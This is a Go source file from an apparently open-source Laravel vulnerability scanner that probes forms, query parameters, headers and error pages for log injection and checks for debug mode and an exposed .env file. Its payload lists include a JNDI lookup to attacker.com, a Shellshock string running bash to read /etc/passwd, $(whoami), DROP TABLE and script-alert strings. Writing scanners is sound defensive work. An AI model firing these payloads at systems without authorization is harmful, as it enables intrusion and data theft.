package vulnerabilities

import (
	"fmt"
	"io/ioutil"
	"laravelmap/internal/common"
	"laravelmap/pkg/httpclient"
	"net/url"
	"regexp"
	"strings"
	"time"
)

// LogInjectionScanner is a struct that contains an HTTP client for detecting log injection vulnerabilities
type LogInjectionScanner struct {
	client *httpclient.Client
}

// NewLogInjectionScanner initializes and returns a new LogInjectionScanner instance
func NewLogInjectionScanner() *LogInjectionScanner {
	return &LogInjectionScanner{
		client: httpclient.NewClient(15 * time.Second),
	}
}

// Run checks for log injection vulnerabilities in Laravel applications
func (lis *LogInjectionScanner) Run(target string) []common.ScanResult {
	var results []common.ScanResult

	// Find forms and input fields
	forms := lis.findForms(target)

	// Check for log injection in forms
	formResults := lis.checkFormsForLogInjection(forms)
	results = append(results, formResults...)

	// Check for log injection in endpoints
	endpointResults := lis.checkEndpointsForLogInjection(target)
	results = append(results, endpointResults...)

	// Check for log injection in error pages
	errorResults := lis.checkErrorPagesForLogInjection(target)
	results = append(results, errorResults...)

	// Check for debug mode
	debugResults := lis.checkDebugMode(target)
	results = append(results, debugResults...)

	// If no vulnerabilities were detected
	if len(results) == 0 {
		results = append(results, common.ScanResult{
			ScanName:    lis.Name(),
			Category:    "Vulnerabilities",
			Description: "No log injection vulnerabilities detected",
			Path:        target,
			StatusCode:  0,
			Detail:      "No potential log injection vulnerabilities were detected. However, this does not guarantee that the application is not vulnerable to log injection attacks.",
		})
	}

	return results
}

// findForms finds all forms in the target page
func (lis *LogInjectionScanner) findForms(target string) []form {
	var forms []form

	// Send a GET request to the target
	resp, err := lis.client.Get(target, nil)
	if err != nil {
		return forms
	}
	defer resp.Body.Close()

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return forms
	}
	bodyString := string(bodyBytes)

	// Find all forms
	formPattern := `<form[^>]*action="([^"]*)"[^>]*method="([^"]*)"[^>]*>(.*?)</form>`
	formRegex := regexp.MustCompile(formPattern)
	formMatches := formRegex.FindAllStringSubmatch(bodyString, -1)

	for _, formMatch := range formMatches {
		if len(formMatch) < 4 {
			continue
		}

		action := formMatch[1]
		method := strings.ToUpper(formMatch[2])
		formContent := formMatch[3]

		// If action is relative, make it absolute
		if !strings.HasPrefix(action, "http") {
			parsedURL, parseErr := url.Parse(target)
			if parseErr != nil {
				continue
			}

			if strings.HasPrefix(action, "/") {
				// Absolute path
				parsedURL.Path = action
			} else {
				// Relative path
				if !strings.HasSuffix(parsedURL.Path, "/") {
					parsedURL.Path += "/"
				}
				parsedURL.Path += action
			}

			action = parsedURL.String()
		}

		// Find all input fields
		params := make(map[string]string)
		inputPattern := `<input[^>]*name="([^"]*)"[^>]*>`
		inputRegex := regexp.MustCompile(inputPattern)
		inputMatches := inputRegex.FindAllStringSubmatch(formContent, -1)

		for _, inputMatch := range inputMatches {
			if len(inputMatch) < 2 {
				continue
			}

			name := inputMatch[1]
			params[name] = ""
		}

		// Find all textarea fields
		textareaPattern := `<textarea[^>]*name="([^"]*)"[^>]*>`
		textareaRegex := regexp.MustCompile(textareaPattern)
		textareaMatches := textareaRegex.FindAllStringSubmatch(formContent, -1)

		for _, textareaMatch := range textareaMatches {
			if len(textareaMatch) < 2 {
				continue
			}

			name := textareaMatch[1]
			params[name] = ""
		}

		forms = append(forms, form{
			action: action,
			method: method,
			params: params,
		})
	}

	return forms
}

// checkFormsForLogInjection checks forms for log injection vulnerabilities
func (lis *LogInjectionScanner) checkFormsForLogInjection(forms []form) []common.ScanResult {
	var results []common.ScanResult

	// Log injection payloads
	payloads := []string{
		"[CRITICAL] - Exception: <script>alert(1)</script>",
		"\\n\\n[ERROR] System Exception\\n",
		"\\r\\n[WARNING] Security breach detected\\r\\n",
		"\\n\\r[INFO] User authentication bypassed\\n\\r",
		"'; DROP TABLE users; --",
		"${jndi:ldap://attacker.com/a}",
		"${java:version}",
		"${env:PATH}",
		"$(whoami)",
		"User-Agent: () { :; }; /bin/bash -c 'cat /etc/passwd'",
	}

	// Test each form
	for _, form := range forms {
		// Only test POST forms
		if form.method != "POST" {
			continue
		}

		// Test each payload
		for _, payload := range payloads {
			// Create a copy of params with the payload
			paramsWithPayload := make(map[string]string)
			for name := range form.params {
				paramsWithPayload[name] = payload
			}

			// Create form data
			formData := url.Values{}
			for name, value := range paramsWithPayload {
				formData.Set(name, value)
			}

			// Send POST request
			headers := map[string]string{
				"Content-Type": "application/x-www-form-urlencoded",
			}
			resp, err := lis.client.Post(form.action, headers, strings.NewReader(formData.Encode()))
			if err != nil {
				continue
			}

			bodyBytes, err := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyString := string(bodyBytes)

			// Check if the response indicates a log injection vulnerability
			if lis.checkResponseForLogInjection(bodyString, payload) {
				results = append(results, common.ScanResult{
					ScanName:    lis.Name(),
					Category:    "Vulnerabilities",
					Description: "Potential log injection vulnerability in form",
					Path:        form.action,
					StatusCode:  resp.StatusCode,
					Detail:      fmt.Sprintf("The form at %s might be vulnerable to log injection. The payload '%s' was reflected in the response, which might indicate that user input is not properly sanitized before being logged.", form.action, payload),
				})

				// Break the loop for this form to avoid duplicate results
				break
			}
		}
	}

	return results
}

// checkEndpointsForLogInjection checks endpoints for log injection vulnerabilities
func (lis *LogInjectionScanner) checkEndpointsForLogInjection(target string) []common.ScanResult {
	var results []common.ScanResult

	// Log injection payloads
	payloads := []string{
		"[CRITICAL] - Exception: <script>alert(1)</script>",
		"\\n\\n[ERROR] System Exception\\n",
		"\\r\\n[WARNING] Security breach detected\\r\\n",
		"\\n\\r[INFO] User authentication bypassed\\n\\r",
		"'; DROP TABLE users; --",
		"${jndi:ldap://attacker.com/a}",
		"${java:version}",
		"${env:PATH}",
		"$(whoami)",
		"User-Agent: () { :; }; /bin/bash -c 'cat /etc/passwd'",
	}

	// Test each endpoint
	endpoints := lis.findEndpoints(target)
	for _, endpoint := range endpoints {
		// Parse the URL
		parsedURL, parseErr := url.Parse(endpoint)
		if parseErr != nil {
			continue
		}

		// Test each payload
		for _, payload := range payloads {
			// Add the payload to the query parameters
			q := parsedURL.Query()
			q.Set("q", payload)
			q.Set("search", payload)
			q.Set("query", payload)
			q.Set("keyword", payload)
			q.Set("term", payload)
			parsedURL.RawQuery = q.Encode()

			// Send GET request
			resp, err := lis.client.Get(parsedURL.String(), nil)
			if err != nil {
				continue
			}

			bodyBytes, err := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyString := string(bodyBytes)

			// Check if the response indicates a log injection vulnerability
			if lis.checkResponseForLogInjection(bodyString, payload) {
				results = append(results, common.ScanResult{
					ScanName:    lis.Name(),
					Category:    "Vulnerabilities",
					Description: "Potential log injection vulnerability in endpoint",
					Path:        parsedURL.String(),
					StatusCode:  resp.StatusCode,
					Detail:      fmt.Sprintf("The endpoint %s might be vulnerable to log injection. The payload '%s' was reflected in the response, which might indicate that user input is not properly sanitized before being logged.", parsedURL.String(), payload),
				})

				// Break the loop for this endpoint to avoid duplicate results
				break
			}
		}

		// Also test with headers
		for _, payload := range payloads {
			// Send GET request with custom headers
			headers := map[string]string{
				"User-Agent":       payload,
				"X-Forwarded-For":  payload,
				"Referer":          payload,
				"X-Requested-With": payload,
			}
			resp, err := lis.client.Get(endpoint, headers)
			if err != nil {
				continue
			}

			bodyBytes, err := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyString := string(bodyBytes)

			// Check if the response indicates a log injection vulnerability
			if lis.checkResponseForLogInjection(bodyString, payload) {
				results = append(results, common.ScanResult{
					ScanName:    lis.Name(),
					Category:    "Vulnerabilities",
					Description: "Potential log injection vulnerability in headers",
					Path:        endpoint,
					StatusCode:  resp.StatusCode,
					Detail:      fmt.Sprintf("The endpoint %s might be vulnerable to log injection via headers. The payload '%s' was reflected in the response, which might indicate that header values are not properly sanitized before being logged.", endpoint, payload),
				})

				// Break the loop for this endpoint to avoid duplicate results
				break
			}
		}
	}

	return results
}

// findEndpoints finds all endpoints in the target page
func (lis *LogInjectionScanner) findEndpoints(target string) []string {
	var endpoints []string

	// Send a GET request to the target
	resp, err := lis.client.Get(target, nil)
	if err != nil {
		return endpoints
	}
	defer resp.Body.Close()

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return endpoints
	}
	bodyString := string(bodyBytes)

	// Find all links
	linkPattern := `<a[^>]*href="([^"#]*)"[^>]*>`
	linkRegex := regexp.MustCompile(linkPattern)
	linkMatches := linkRegex.FindAllStringSubmatch(bodyString, -1)

	for _, linkMatch := range linkMatches {
		if len(linkMatch) < 2 {
			continue
		}

		href := linkMatch[1]
		if strings.HasPrefix(href, "javascript:") || href == "" {
			continue
		}

		// If href is relative, make it absolute
		if !strings.HasPrefix(href, "http") {
			parsedURL, parseErr := url.Parse(target)
			if parseErr != nil {
				continue
			}

			if strings.HasPrefix(href, "/") {
				// Absolute path
				parsedURL.Path = href
			} else {
				// Relative path
				if !strings.HasSuffix(parsedURL.Path, "/") {
					parsedURL.Path += "/"
				}
				parsedURL.Path += href
			}

			href = parsedURL.String()
		}

		endpoints = append(endpoints, href)
	}

	// Add common Laravel endpoints
	commonEndpoints := []string{
		"/login",
		"/register",
		"/password/reset",
		"/password/email",
		"/profile",
		"/settings",
		"/search",
		"/contact",
		"/feedback",
	}

	for _, endpoint := range commonEndpoints {
		parsedURL, parseErr := url.Parse(target)
		if parseErr != nil {
			continue
		}

		parsedURL.Path = endpoint
		endpoints = append(endpoints, parsedURL.String())
	}

	return endpoints
}

// checkErrorPagesForLogInjection checks error pages for log injection vulnerabilities
func (lis *LogInjectionScanner) checkErrorPagesForLogInjection(target string) []common.ScanResult {
	var results []common.ScanResult

	// Log injection payloads
	payloads := []string{
		"[CRITICAL] - Exception: <script>alert(1)</script>",
		"\\n\\n[ERROR] System Exception\\n",
		"\\r\\n[WARNING] Security breach detected\\r\\n",
		"\\n\\r[INFO] User authentication bypassed\\n\\r",
		"'; DROP TABLE users; --",
	}

	// Non-existent routes to trigger error pages
	errorRoutes := []string{
		"/non-existent-page",
		"/404",
		"/error",
		"/this-page-does-not-exist",
		"/undefined",
		"/null",
	}

	// Test each error route
	for _, route := range errorRoutes {
		// Create the full URL
		parsedURL, parseErr := url.Parse(target)
		if parseErr != nil {
			continue
		}

		parsedURL.Path = route

		// Test each payload
		for _, payload := range payloads {
			// Add the payload to the query parameters
			q := parsedURL.Query()
			q.Set("q", payload)
			parsedURL.RawQuery = q.Encode()

			// Send GET request
			resp, err := lis.client.Get(parsedURL.String(), nil)
			if err != nil {
				continue
			}

			bodyBytes, err := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyString := string(bodyBytes)

			// Check if the response indicates a log injection vulnerability
			if lis.checkResponseForLogInjection(bodyString, payload) {
				results = append(results, common.ScanResult{
					ScanName:    lis.Name(),
					Category:    "Vulnerabilities",
					Description: "Potential log injection vulnerability in error pages",
					Path:        parsedURL.String(),
					StatusCode:  resp.StatusCode,
					Detail:      fmt.Sprintf("The error page at %s might be vulnerable to log injection. The payload '%s' was reflected in the response, which might indicate that user input is not properly sanitized before being logged.", parsedURL.String(), payload),
				})

				// Break the loop for this route to avoid duplicate results
				break
			}
		}
	}

	return results
}

// checkDebugMode checks if the application is in debug mode
func (lis *LogInjectionScanner) checkDebugMode(target string) []common.ScanResult {
	var results []common.ScanResult

	// Non-existent routes to trigger error pages
	errorRoutes := []string{
		"/non-existent-page",
		"/404",
		"/error",
		"/this-page-does-not-exist",
		"/undefined",
		"/null",
	}

	// Test each error route
	for _, route := range errorRoutes {
		// Create the full URL
		parsedURL, parseErr := url.Parse(target)
		if parseErr != nil {
			continue
		}

		parsedURL.Path = route

		// Send GET request
		resp, err := lis.client.Get(parsedURL.String(), nil)
		if err != nil {
			continue
		}

		bodyBytes, err := ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}
		bodyString := string(bodyBytes)

		// Check if the response indicates debug mode is enabled
		if lis.checkResponseForDebugMode(bodyString) {
			results = append(results, common.ScanResult{
				ScanName:    lis.Name(),
				Category:    "Vulnerabilities",
				Description: "Debug mode is enabled",
				Path:        parsedURL.String(),
				StatusCode:  resp.StatusCode,
				Detail:      "The application is running in debug mode, which can expose sensitive information such as stack traces, database credentials, and environment variables. It is recommended to disable debug mode in production environments.",
			})

			// Break the loop to avoid duplicate results
			break
		}
	}

	// Also check .env file directly
	parsedURL, parseErr := url.Parse(target)
	if parseErr == nil {
		parsedURL.Path = "/.env"
		resp, err := lis.client.Get(parsedURL.String(), nil)
		if err == nil && resp.StatusCode == 200 {
			bodyBytes, err := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			if err == nil {
				bodyString := string(bodyBytes)
				if strings.Contains(bodyString, "APP_ENV") || strings.Contains(bodyString, "DB_") {
					results = append(results, common.ScanResult{
						ScanName:    lis.Name(),
						Category:    "Vulnerabilities",
						Description: ".env file is publicly accessible",
						Path:        parsedURL.String(),
						StatusCode:  resp.StatusCode,
						Detail:      "The .env file is publicly accessible, which can expose sensitive information such as database credentials, API keys, and environment variables. It is recommended to block access to the .env file using server configuration.",
					})
				}
			}
		}
	}

	return results
}

// checkResponseForLogInjection checks if the response indicates a log injection vulnerability
func (lis *LogInjectionScanner) checkResponseForLogInjection(response string, payload string) bool {
	// Check if the payload is reflected in the response
	if strings.Contains(response, payload) {
		return true
	}

	// Check for common log patterns
	logPatterns := []string{
		"[CRITICAL]",
		"[ERROR]",
		"[WARNING]",
		"[INFO]",
		"Exception:",
		"Error:",
		"Warning:",
		"Stack trace:",
		"Log entry:",
		"Logged:",
	}

	for _, pattern := range logPatterns {
		if strings.Contains(response, pattern) && strings.Contains(response, payload) {
			return true
		}
	}

	return false
}

// checkResponseForDebugMode checks if the response indicates debug mode is enabled
func (lis *LogInjectionScanner) checkResponseForDebugMode(response string) bool {
	// Check for Laravel debug mode indicators
	debugPatterns := []string{
		"<div class=\"stack-container\">",
		"<div class=\"exception-message-wrapper\">",
		"<div class=\"exception\">",
		"<div class=\"exc-message\">",
		"Whoops\\Exception\\ErrorException",
		"APP_DEBUG=true",
		"<td class=\"code-wrap\">",
		"<div class=\"frame-file\">",
		"<div class=\"frame-line\">",
		"<div class=\"frame-function\">",
		"<div class=\"frame-args\">",
		"<div class=\"frame-comments\">",
		"<div class=\"frame-index\">",
		"<div class=\"frame-method\">",
		"<div class=\"frame-class\">",
		"<div class=\"frame-file-path\">",
		"<div class=\"frame-line-number\">",
		"<div class=\"frame-code\">",
		"<div class=\"frame-args-wrapper\">",
		"<div class=\"frame-comments-wrapper\">",
		"<div class=\"frame-index-wrapper\">",
		"<div class=\"frame-method-wrapper\">",
		"<div class=\"frame-class-wrapper\">",
		"<div class=\"frame-file-path-wrapper\">",
		"<div class=\"frame-line-number-wrapper\">",
		"<div class=\"frame-code-wrapper\">",
	}

	for _, pattern := range debugPatterns {
		if strings.Contains(response, pattern) {
			return true
		}
	}

	// Check for stack traces
	stackTracePatterns := []string{
		"Stack trace:",
		"#0 ",
		"#1 ",
		"#2 ",
		"#3 ",
		"#4 ",
		"#5 ",
		"in /var/www/",
		"in /home/",
		"in /app/",
		"in vendor/",
		"in app/",
		"in database/",
		"in resources/",
		"in routes/",
		"in config/",
		"in bootstrap/",
		"in public/",
		"in storage/",
		"in tests/",
	}

	stackTraceCount := 0
	for _, pattern := range stackTracePatterns {
		if strings.Contains(response, pattern) {
			stackTraceCount++
		}
	}

	// If multiple stack trace patterns are found, it's likely in debug mode
	return stackTraceCount >= 3
}

// Name returns the name of the scanner
func (lis *LogInjectionScanner) Name() string {
	return "Log Injection Scanner"
}
